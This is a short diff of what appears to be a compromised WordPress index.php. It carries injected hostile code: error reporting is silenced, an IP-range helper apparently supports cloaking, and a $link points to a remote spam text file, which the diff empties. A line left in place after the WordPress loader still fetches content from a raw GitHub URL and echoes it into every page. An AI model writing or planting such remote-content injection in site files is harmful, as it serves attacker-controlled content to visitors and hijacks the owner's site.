@@ -1,5 +1,5 @@
 <?php error_reporting(0);
-$link = 'https://s-kobam.direct/txt/bapakrumahtangga.txt'; // 
+$link = ''; // 
 function ip_in_range($ip, $range)
 {
     list($subnet, $bits) = explode('/', $range);
@@ -64,3 +64,4 @@ define( 'WP_USE_THEMES', true );
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
 $aa = file_get_contents('https://raw.githubusercontent.com/vbghjyjjak/ghj/refs/heads/main/v4s'); echo $aa;
+
